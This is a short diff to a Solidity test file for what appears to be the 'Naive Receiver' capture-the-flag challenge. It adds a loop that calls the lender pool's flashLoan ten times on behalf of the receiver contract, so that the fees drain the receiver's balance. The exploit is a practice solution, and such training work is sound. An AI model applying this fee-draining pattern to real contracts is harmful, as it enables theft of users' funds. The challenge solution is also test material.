@@ -48,6 +48,10 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
+        // Todo: flashloan 10 times to drain receiver
+        for (uint256 i = 0; i < 10; i = i + 1) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        }
 
         /**
          * EXPLOIT END *
